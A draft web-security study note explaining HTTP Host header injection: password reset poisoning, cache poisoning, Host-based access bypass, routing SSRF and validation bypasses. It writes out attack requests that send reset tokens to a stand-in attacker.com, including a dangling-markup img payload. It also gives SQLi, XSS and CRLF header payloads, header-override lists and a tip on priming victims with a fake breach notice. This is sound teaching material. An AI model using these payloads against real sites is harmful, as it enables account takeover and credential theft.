---
created: 2026-05-29
tags:
  - web_hacking
  - intermediaries
status: draft
---

**Table of Contents**

- [[#The Host header]]
	- [[#Virtual hosting]]
	- [[#Intermediary routing]]
- [[#Host header injection]]
	- [[#Password reset poisoning]]
	- [[#Web cache poisoning]]

## The `Host` header

>The **HTTP [`Host`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Host) header** is a mandatory request header that specifies the domain name — and optionally the port number — of the server to which the client intends to direct the request.

- The `Host` header was introduced in HTTP/1.1. It enables a single network endpoint to host and correctly route requests to multiple distinct applications, distinguished solely by their domain names. 

```HTTP
GET / HTTP/1.1
Host: example.com
```

### Virtual hosting

- Before HTTP/1.1, one IP address mapped to exactly one website (domain name). 
- However, under the weight of IPv4 exhaustion and the rise of *multi-tenancy* and *shared hosting*, this wasn't practical anymore.
- This is why **virtual hosting** was introduced. 

>**Virtual hosting** is a technique that allows a single physical machine bound to a single IP address to serve **multiple websites** under **distinct domain names**. 

- In virtual hosting, a server can host multiple different domain names. Each inbound HTTP request is routed to a designated application (or document root) based on the value of the `Host` header.

> [!example]+
> 
> - Example Apache configuration:
> 
> ```xml
> Listen 80
> <VirtualHost *:80>
>     ServerName app.example.com
>     DocumentRoot /var/www/app
> </VirtualHost>
> 
> <VirtualHost *:80>
>     ServerName admin.example.com
>     DocumentRoot /var/www/admin
> </VirtualHost>
> ```
> 
> - Both virtual hosts share the same listening locket on port `80`.
> - The `ServerName` directive maps a `Host` value to a document root.
> - In other words, both sides are reachable at the same IP address, and are accessible by changing the `Host` header value.

>[!warning]+ In HTTP/2, the `Host` header is functionally replaced by the `:authority` pseudo-header, which is part of the HPACK-compressed header block. 
>- The legacy `Host` header may still be present in HTTP/2 requests for backward compatibility.
>- Servers that accept both simultaneously — and prioritize them inconsistently — are vulnerable to pseudo-header conflict attacks.

> [!interesting]+ Virtual hosts vs. subdomains
> - A **subdomain** is part of the DNS hierarchy (e.g. `app.example.com`). It usually has its own DNS records (`A`, `AAAA`, `CNAME`, etc.) and may point to the same IP address as other subdomains or to a different one.
> - A **virtual host** is configured on a web server (e.g. Apache or Nginx). It determines which website or application responds to an HTTP(S) request, typically based on the `Host` header.
> - Multiple subdomains can point to the same virtual host, and multiple virtual hosts can share the same IP address.
> - A virtual host may exist without a public DNS record. Such hosts are often used for:
>     - Internal testing or staging environments
>     - Administrative interfaces
>     - Development versions of production sites
>     - Services accessible only through VPN or internal DNS
>     - Reverse-proxy backends
>---
>- **DNS decides where traffic goes**.
>- **Virtual hosting decides what responds once traffic arrives**.

>[!note]+ Most cache servers include the `Host` header in their cache key to differentiate between responses cached for different virtual hosts. See [[Web caches#Cache keys]].

### Intermediary routing

- Browser traffic is rarely routed directly to the target application. A typical request traverses CDN edge nodes, load balancers, reverse proxies (Nginx, HAProxy, Envoy), API gateways, and WAFs before reaching the server that generates the response.
- Each of these components may inspect, forward, rewrite, or strip the `Host` header.
---
- Different layers of the stack may **disagree** on what the effective `Host` value is. 
- So, if you inject ambiguous or conflicting header values, you may be able to exploit parsing inconsistencies to pass validation at one layer while influencing behavior at another. This is the core principle that underlies most `Host` header injection attacks.

> [!important] When a CDN or reverse proxy forwards requests to a back-end, it commonly injects `X-Forwarded-Host` to preserve the original client-facing hostname — because the `Host` header the back-end sees may contain an internal hostname belonging to the intermediary's own routing fabric. Back-end frameworks are frequently configured to read `X-Forwarded-Host` preferentially. This makes `X-Forwarded-Host` a high-value injection vector: the front-end validates `Host`, while the back-end uses the unvalidated `X-Forwarded-Host`.
## `Host` header injection

- `Host` header injection vulnerabilities arise when the server implicitly trusts the value of the header and uses it without proper validation. This stems from the assumption that the header can't be forged.

>[!note]+ `Host` header in Burp Suite
>- Burp Suite deliberately decouples the value of the `Host` header from the actual request destination. 
>- This means you can set `Host: attacker.com`, while the underlying socket connection still reaches the `example.com`'s IP address.
>- Most tools do not support this — they derive the destination address from the `Host` header and would actually route the packet to `attacker.com`.

- Applications leverage the `Host` header to dynamically construct:
	- Absolute URLs in redirect responses (`Location` headers after login, logout, password resets, etc.).
	- Password reset and email verification links sent via SMTP.
	- URLs for scripts, stylesheets, and images embedded in HTML.
	- CORS origin checks.
	- Routing and access control decisions in infrastructure components.

- When such operation doesn't validate that the `Host` value belongs to the application's own domain, the header becomes an attack vector.

>[!interesting]+ Why `Host` header vulnerabilities arise
> 
> - **Application logic**
> 
> 	- Many applications have no independent knowledge on what domain they are deployed on unless it's manually specified in a configuration file during setup. 
> 	- When they need to know the current domain — to generate an absolute URL included in an email, for example — they fall back to reading it from the request:
> 	
> 	```php
> 	# legacy PHP, WordPress derivatives, etc.
> 	$reset_url = "https://" . $_SERVER['HTTP_HOST'] . "/reset?token=" . $token;
> 	```
> 	
> 	```python
> 	# Django before ALLOWED_HOSTS was enforced
> 	domain = request.META.get('HTTP_HOST')
> 	reset_link = f"https://{domain}/password-reset/{token}/"
> 	```
> 	
> 	- In both cases, the `Host` header value flows into the generated URL with no validation.
>
> - **Infrastructure misconfigurations**
> 	- Rather than from flawed application logic, `Host` header vulnerabilities also commonly stem from infrastructure misconfiguration.
> 	- Suppose a reverse proxy is deployed in front of an application. This proxy may inject `X-Forwarded-Host` to tell the backend what the original client-facing hostname was. The backend framework trusts the header — because it is set by a trusted proxy server.
> 	- The problem arises when the proxy does not strip or validate `X-Forwarded-Host` from _inbound_ client requests, so you can set that header directly yourself. 
> 	- This effectively defeats any protection enforced on the `Host` header itself.
> 
> ```http
> GET / HTTP/1.1
> Host: example.com
> X-Forwarded-Host: attacker.com
> ```

### Password reset poisoning

> **Password reset poisoning** is an attack in which an adversary manipulates the `Host` header(or an equivalent override header) of a password reset request, so that the resulting reset link — sent by the server to the victim's email address — points to a domain controlled by the attacker. When the victim follows the link, the reset token is delivered to the attacker; the attacker intercepts the links and compromises the account.

- The vulnerability occurs when the application constructs the password reset link by reading the current domain from the `Host` header of the reset request rather than a preconfigured value. 
- You, who submits the reset request, control the header entirely.

---
1. **Password reset request**
	- Intercept the password reset request in `Repeater`. 
	- Change the value of the `Host` header to **your controlled domain**.
	- Change the email or username in the request to the one associated with the victim's account.

```HTTP
POST /password-reset HTTP/1.1
Host: attacker.com
...

email=victim@example.com
```


2. **Link generation**
	- The application generates a password reset link using the value of the `Host` header from the password reset request.
	- The request is sent to the victim's email. 

```powershell
https://attacker.com/password-reset?token=r34lly_r4nd0m_t0k3n
```

3. **Obtaining the token**
	- The victim clicks the link in the email.
	- The `GET` request that follows carries the token to your server, which logs it.

4. **Account takeover**
	- You use the stolen token directly against the application, set a new password, and log in.

```powerhshell
https://example.com/password-reset?token=r34lly_r4nd0m_t0k3n
```

>[!tip]+ 
>In a real attack, you may seek to increase the probability that your victim clicks the link, such as by first warming them up with a fake breach notification (e.g., "There was a breach, you will receive an email to reset your passwords in a few minutes").

> [!note] Password reset poisoning was first documented by James Kettle in 2013 ([Practical HTTP Host header attacks](https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)). A well-documented HackerOne report demonstrating this attack against a real target: [#226659](https://hackerone.com/reports/226659).

- When direct `Host` injection is blocked:
	- Try `X-Forwarded-Host: attacker.com` with a legitimate `Host: example.com`. The front-end validates `Host`; the application uses `X-Forwarded-Host` to construct the URL.
	- If neither works but the `Host` value is reflected anywhere in the email body as HTML, consider **dangling markup injection**: break out of the surrounding HTML context and use an unclosed `<img src="https://attacker.com/` tag.
	- Email clients fetch image URLs, leaking the token via the request path.

	```html
	<!-- before injection -->
	<a href="https://HOST_READER_VALUE/password-reset?token=r34lly_r4nd0m_t0k3n">Reset password</a>
	
	<!-- injection:
	Host: "><img src="http://attacker.com/?request=
	-->
	<a href="https://"><img src="http://attacker.com/?request=/password-reset?token=r34lly_r4nd0m_t0k3n">Reset password</a>
	```

>[!bug]+ Labs
>- [[🛠️ Host header injection labs#1. Basic password reset poisoning]]
>- [[🛠️ Authentication labs#11. Password reset poisoning via middleware]]
### 🛠️ Web cache poisoning

Even if the `Host` header seems unexploitable but you know that the application is using cache, it's worth testing for web cache poisoning.

>If the cache server doesn't include the `Host` header or some of its parts (such as port number) in the cache key, but the backend server incorporates the complete value of the header in the responses without proper validation, web poisoning in the `Host` header is possible. The attacker can trick the cache into storing the response with the malicious `Host` value reflected and serving this content to other users.

You may send a request with duplicate `Host` headers, such as:

```HTTP
GET /?cb=123 HTTP/1.1
Host: example.com
Host: attacker.com
```

Under the hood, the attack might work as follows:

- **Cache logic**:
    - The cache server **only inspects the *first* `Host` header** (i.e., `example.com`), and ignores the second (`attacker.com`). In this case, the second `Host` header acts as an *unkeyed input* if that header affects the application's response.
    - The **cache key** is generated as if request is normal (i.e., `example.com/?cb=123`), and the poisoned response is stored under this genuine cache key.
    - No error is raised — the duplicate is ignored.

When a regular user later requests the same URL, the cache will match and serve the cached content influenced by the second `Host` header (if not expired).

- **Backend server logic**:
	- The backend server **uses the last `Host` header** (i.e., `attacker.com`) and uses it to construct a response.
	- That response gets stored in the cache under the normal cache key.
	- For example, the backend might use the header to dynamically create URLs or script tags:

```HTML
<script src="https://attacker.com/resources/js/tracking.js"></script>
```

The attacker then arranges for a public resource (like `tracking.js`) to be available at `attacker.com`, and injects a payload (e.g., `alert(document.cookie)`). Once the response is cached, _everyone_ who loads that page (even with only one `Host` header) will get the poisoned content.

The backend may reflect the `Host` header in, for example:
- Redirect URLs
- Links to static content (like in the above example)

>[!note] When attackers introduce ambiguity—such as **duplicate Host headers**—different infrastructure components might choose _different_ values when parsing. This allows attackers to "split" logic between layers:
>- **Cache Layer Logic:** May use the first `Host` header to validate and build the cache key.
>- **Backend Logic:** May use the _last_ (or a different) `Host` header when constructing response content or URLs.

>[!note] [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230) (HTTP/1.1) says a request with multiple Host headers is malformed, but many servers/infrastructure ignore or inconsistently process duplicates for robustness or legacy reasons.

>[!note]
>See [[🛠️ Web Cache Poisoning]].
### Authentication bypass

- Some applications gate privileged functionality on the value of the `Host` header: administrative interfaces, internal dashboards, or privileged endpoints are restricted to requests whose `Host` value matches an internal hostname (`localhost`, `127.0.0.1`, or a known internal hostname).
- If the application does not additionally verify that the _source_ of the request is actually internal — and relies solely on the `Host` header value you can spoof — you can impersonate an internal client.

```http
GET /admin HTTP/1.1
Host: localhost
```

```http
GET /admin HTTP/1.1
Host: 127.0.0.1
```

- Try the full loopback and [`RFC 1918`](https://datatracker.ietf.org/doc/html/rfc1918) ranges:
	- `127.0.0.0/8`
	- `10.0.0.0/8`
	- `172.16.0.0/12`
	- `192.168.0.0/16`

```powershell
localhost
127.0.0.1
127.0.0.2
10.0.0.1
10.0.0.2
172.16.0.1
192.168.0.1
192.168.1.1
admin.internal
intranet
backend
```

- When these fail, attempt obfuscation techniques from [[SSRF#Bypassing validation]], such as octal representation (`0177.0.0.1`), hex (`0x7f000001`), decimal integer (`2130706433`), IPv6 loopback (`[::1]`), etc.
- Try to inject custom HTTP headers like `X-Forwarded-For: 127.0.0.1`, `X-Forwarded-Host: 127.0.0.1`, etc.

>[!bug]+ Labs
>- [[🛠️ Host header injection labs#2. Host header authentication bypass]]

### Routing-based SSRF

>**Routing-based SSRF** is a [[SSRF]] in which an attacker manipulates the `Host` header to cause an intermediary component — typically a reverse proxy or load balancer — to forward the request to an unintended internal destination.

- Classic SSRF vulnerabilities usually exploit [[XXE injection]] vulnerabilities or business logic flaws that construct outbound HTTP requests to destinations derived from user-controlled input. Routing-based SSRF operates one layer lower. 
---
- Applications often use intermediary components (e.g., reverse proxies) that use the `Host` header to:
	- Route traffic to the correct backend server or virtual host.
	- Select internal services based on the domain name or IP address in the `Host` header.
	- Log traffic for tracking purposes.
- If these intermediary components are configured to forward requests based on the `Host` header without proper validation, you can manipulate them into sending requests to arbitrary locations of your choice.

---
1. Supply a domain name you control as the `Host` header value (e.g., Burp Collaborator's domain). 

	```http
	GET / HTTP/1.1
	Host: <collaborator_id>.oastify.com
	```
	
	- If you receive a DNS lookup or an HTTP request from the target server, this indicates the intermediary is making outbound requests based on the `Host` header.

2. Pivot to internal targets. Probe for internal address ranges to see if you can access anything; brute-force internal IP addresses and/or hostnames to identify live hosts.

>[!bug]+ Labs
>- [[🛠️ Host header injection labs#4. Routing-based SSRF]]
>- [[🛠️ Host header injection labs#5. SSRF via flawed request parsing]]

>[!note] See [`Cracking the lens: targeting HTTP's hidden attack-surface — James Kettle, PortSwigger Research`](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface).

### Connection state attacks

- Many websites reuse connections for multiple request/response pairs with the same client (HTTP/1.1 `Connection: keep-alive`).
- Some server implementations perform full `Host` header validation only on the first request per connection and skip or reduce validation on subsequent requests for performance. 

---
1. In Burp Repeater, click the settings icon `Enable HTTP/1 connection reuse`. This forces `Repeater` to reuse the same TCP connection across successive sends.
    
2. Send an initial, benign request that passes all `Host` validation:
    
```http
GET / HTTP/1.1
Host: example.com
Connection: keep-alive
```

3. Immediately send the malicious request over the same connection:

```http
GET /admin HTTP/1.1
Host: localhost
```

- The server, having already validated and associated the connection with `example.com`, processes the second request without re-evaluating the `Host` header. The `Host: localhost` check that would normally block access to `/admin` is never executed.

### Classic server-side vulnerabilities 

- The `Host` header is a string. Any vulnerability class that can be triggered by injecting into a string — [[SQL injection]], [[XSS]], [[SSTI]], CRLF injection, [[Path traversal]] — can potentially be triggered via the `Host` header, provided that the value reaches the vulnerable sink.

---

- **SQL injection** — If the application logs requests to a database or applies rate limiting based on the `Host` value — without using parameterized queries. 
	
	```http
	GET / HTTP/1.1
	Host: example.com' OR '1'='1
	```
	
	```http
	GET / HTTP/1.1
	Host: example.com' AND SLEEP(5)-- -
	```

- **Reflected XSS** — If the value of the `Host` header appears somewhere in application responses, such as a parameter to an image URL for tracking:
	
	```http
	GET / HTTP/1.1
	Host: "><script>alert(document.domain)</script>
	```
	
	- Exploitation in this case is usually combined with [[🛠️ Web Cache Poisoning]], since you can't really craft a URL that forces a victim browser to set a specific `Host` value.

- **CRLF injection** — If the `Host` value flows into an HTTP response header without sanitization, most commonly in a `Location` redirect URLs generated dynamically based on the `Host` value, CRLF injection (`%0d%0a`) can be used to add arbitrary response headers or injection HTTP response body:

```http
GET / HTTP/1.1
Host: attacker.com%0d%0aSet-Cookie:%20session=attacker
```

## Testing methodology

- The objective is to determine:
	1) whether you can deliver an attacker-controlled value into the application's effective `Host`; and 
	2) whether that value influences server-side behavior in a meaningful, exploitable way.
---
1. **Intercept a request and modify the `Host` header using Burp Repeater**
	- Set the header to a domain you control (such as Burp Collaborator) and send the request. 
	- If callbacks are detected, this means you can make the target or intermediary server make requests to arbitrary domains.  
	- If the application reflects the header value somewhere in response — such as in a redirect `Location` header, absolute URL in the HTML body, etc., this confirms an inject point. 

2. **Probe for reflected output**
	- Once you can reach the application with a modified `Host`, systematically look for reflection of that value. 
	- Places to check:
		- **`Location` header** in any redirect response (`3xx`).
		- **Absolute URLs** in `<a href>`, `<form action>`, `<script src>`, `<link href>` tags.
		- **Password reset and email flows** — trigger password reset and inspect the generated link.
		- **JSON API responses** that contain full URLs.
		- **Error messages and debug output** that echo server configuration.


3. **Check for flawed validation**
	- If the application rejected your arbitrary `Host` value, try to understand how the validation logic works to bypass it. 
	- See [`URL validation bypass cheat sheet — PortSwigger Web Security Academy`](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet).

4. **Send ambiguous requests**
	- You may be able to exploit validation discrepancies between the front-end and backend servers to bypass validation. Injecting double `Host` header values, one of which is validated by the front-end server, and another — by the backend, and observe application behavior.

	- **Duplicate `Host` headers**:

		```http
		GET / HTTP/1.1
		Host: example.com
		Host: attacker.com
		```
	
		- [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230) defines that a request with multiple `Host` headers as malformed, but most production servers accept it anyway for robustness. 
		- The front-end components may validate the first `example.com` (or the last) `Host` header valid, and the backend may use the last (or the first) without validation (`attacker.com`), assuming it's safe once passed front-end server checks.

	- **Send absolute URL in the request line**:

		```http
		GET https://example.com/ HTTP/1.1
		Host: attacker.com
		```
		
		- [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230) states the request line takes precedence over `Host` for routing. 
		- In practice, however, many servers route based on the request line but pass both headers downstream, where the application uses the malicious `Host` header, such as for URL generation.
		- Try both `http://` and `https://`.

	- **Line-wrapped (indented) `Host` header**:
		
		```http
		GET / HTTP/1.1
		    Host: attacker.com
		Host: example.com
		```

		- This may confuse parsers so you can exploit inconsistencies between front-end and backend servers.

5. **Inject `Host` override headers**

	```http
	GET / HTTP/1.1
	Host: example.com
	X-Forwarded-Host: attacker.com
	```

	- Even when the `Host` header is strictly validated, many frameworks preferentially use `X-Forwarded-Host` or a similar header when present, because reverse proxies are often configured to set this header to carry the real client hostname.

	- Headers to try:
	
		```
		X-Forwarded-Host: attacker.com
		X-Host: attacker.com
		X-Forwarded-Server: attacker.com
		X-HTTP-Host-Override: attacker.com
		Forwarded: host=attacker.com
		X-Original-URL: /admin
		X-Rewrite-URL: /admin
		X-Custom-IP-Authorization: 127.0.0.1
		X-Forwarded-For: 127.0.0.1
		True-Client-IP: 127.0.0.1
		X-Real-IP: 127.0.0.1
		X-Client-IP: 127.0.0.1
		```
## Bypassing validation

Some websites validate whether the `Host` header matches the SNI from the TLS handshake. However, such validation is not bulletproof and it might be possible to bypass it. Here is why:
- Different components of the infrastructure, such as front-end proxy servers, load balancers, and back-end applications, may interpret the `Host` header differently. Discrepancies between these components can sometimes be exploited to bypass validation.
- Certain headers (like `X-Forwarded-Host`) are designed to override or supplement the Host header, and may be trusted by back-end logic even if the main `Host` header is validated.
- Older or misconfigured systems may process multiple `Host` headers, or prioritize one over another, creating opportunities for injection.

### Duplicate `Host` headers

- Send two or more `Host` headers in a single request.
- This exploits discrepancies between how different components of the infrastructure interpret the headers.
- For example, front-end server may use the first header, and the back-end — the last. In this case, the front-end server, hacking checked the first occurrence of the `Host` header and haven't found anything unusual, forwards the request to the back-end server. The back-end server, however, uses the last occurrence of the header, which the front-end didn't check.

```HTTP
GET / HTTP/1.1
Host: example.com
Host: attacker.com
```

### Inject `Host` override headers

- Use headers that can override or supplement the `Host` header, such as:

```Bash
X-Forwarded-Host:
X-Host:
X-Forwarded-Server:
X-HTTP-Host_Override:
Forwarded:
X-Original-URL:
X-Forward-For:
X-Forwarded-For:
Client-IP:
Connection:
Contact:
From:
Origin:
Referer:
True-Client-IP:
X-Client-IP:
X-Custom-IP-Authorization:
X-Originating-IP:
X-Real-IP:
X-Remote-Addr:
X-Remote-IP:
X-Rewrite-URL:
X-Wap-Profile:
```

For example:

```HTTP
GET / HTTP/1.1
Host: example.com
X-Forwarded-Host: attacker.com
```

- Say, the front-end server verifies the `Host` header and ignores `X-Forwarded-Host`, but the back-end server, on the contrary, uses the `X-Forwarded-Host` header.
### Inject malformed `Host` values

Use malformed, encoded, or ambiguous values in the `Host` header.
- Add whitespaces, tabs, or unusual characters:

```HTTP
---
Host: example.com
	Host: attacker.com # tab
---
Host: example.com 
 Host: attacker.com # space
---
Host: example.com
Host: attacker.com # trailing space
```

- Use encoded characters, such as Unicode or percent-encoding:

```HTTP
---
Host: example.com
Host: attacker.com%0A
---
Host: example.com
Host: attacker.com%00
```

### `Host` header with ports, non-numeric, or malformed values

- Register an arbitrary domain that contains or ends with the same characters as the whitelisted one. This may bypass simple matching logic.

```HTTP
GET / HTTP/1.1
Host: attacker-example.com
```

- Add an arbitrary, non-numeric port value:

```HTTP
GET / HTTP/1.1
Host: example.com:unexpected-input
```

### Specify absolute URL

- The request line typically specifies a relative path on the requested domain, but many servers are configured to understand requests with absolute URLs as well.
 
- To exploit possible discrepancies between different systems, inject both an absolute URL and a `Host` header. The request line is supposed to take precedence over `Host`, but servers might be configured differently.

```HTTP
GET https://example.com HTTP/1.1
Host: attacker.com
```

- Try both HTTP and HTTPS.

### Take advantage of a less-secure subdomain

- Specify a subdomain that you have already compromised:
```HTTP
GET / HTTP/1.1
Host: insecure.example.com
```

### Remove the `Host` header entirely

- Try to send a request without the `Host` header or use other techniques but omit the header:

```HTTP
GET / HTTP/1.1
...
```

```HTTP
GET https://attacker.com HTTP/1.1
...
```

```HTTP
GET / HTTP/1.1
X-Forwarded-For: attacker.com
```

### Inject CSRF characters

- Inject carriage return and line feed (`\r\n`) characters into the `Host` header to create new headers or manipulate downstream parsing:
```HTTP
Host: attacker.com\r\nX-Injected-Header: value
```

### Brute-force virtual hosts

- Send requests with varying `Host` header values to enumerate internal or hidden virtual hosts.
- Discover internal services, admin panels, or staging environments.

```HTTP
Host: admin.local
Host: internal.example.com
```

### Ambiguous requests via HTTP/2 pseudo-headers

- In HTTP/2, send both `:authority` (pseudo-header) and a traditional `host` header, or duplicate pseudo-headers to confuse servers.

```HTTP
:authority: example.com
host: attacker.com
```

### Authentication and access control bypass

- Many applications restrict sensitive functionality to internal users. If access controls are based on the `Host` header, bypass is possible. 

- Set the `Host` header to internal hostnames or IP addresses such as `localhost`, `127.0.0.1`, etc. to bypass access controls that rely on trusted hostnames.

```HTTP
Host: localhost
```


## References

- [`HTTP Host header attacks — PortSwigger Web Security Academy`](https://portswigger.net/web-security/host-header)
- [`How to identify and exploit HTTP Host header vulnerabilities — PortSwigger Web Security Academy`](https://portswigger.net/web-security/host-header/exploiting#exploiting-classic-server-side-vulnerabilities)
- [`Password reset poisoning — PortSwigger Web Security Academy`](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)

- [`HTTP Host headers — oscp-exodussec`](http://oscp-exodussec.gitbook.io/cheatsheet55/bscp/3-.http-host-headers)
- [`Special HTTP headers — HackTricks`](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/special-http-headers.html)

- Reports:
	- https://hackerone.com/reports/1096609
	- https://hackerone.com/reports/123513
## Drafts


>[!tip]+
>When testing for vulnerabilities — such as password reset poisoning — attackers and security testers often need to receive and log HTTP requests from victims or applications. If they don't have an HTTP server and a domain set up, they can use online webhook services. Here is a list of such services available for free:
> 
> - [`Request Catcher`](https://requestcatcher.com/)
> 	- Creates a subdomain where you can test a application (e.g., `attacker.requestcatcher.com`); all requests sent to any path on this subdomain will be logged and displayed in your browser in real time.
> 
> - [`Webhook.site`](https://webhook.site/)
> 	- Generates a unique temporary URL for you to receive and inspect HTTP requests; the endpoint is based on a unique path, not a domain or subdomain.
> 	- Also provides a temporary email address, a name (subdomain; this service is called [`DNSHook`](https://docs.webhook.site/dnshook.html)), and a bi-directional proxy with `Webhook.site` CLI.
> 	- These resources expire after some time; premium version lets you create unlimited number of webhooks with history up to 10.000 items and provides some other features.
> 
> - [`Request Bin`](https://pipedream.com/requestbin)
> 	- Provides similar functionality as websites above, but requires registration.
>
>In Burp Suite, there's a tool called Burp Collaborator that provides similar functionality, but it's only available in Professional edition.


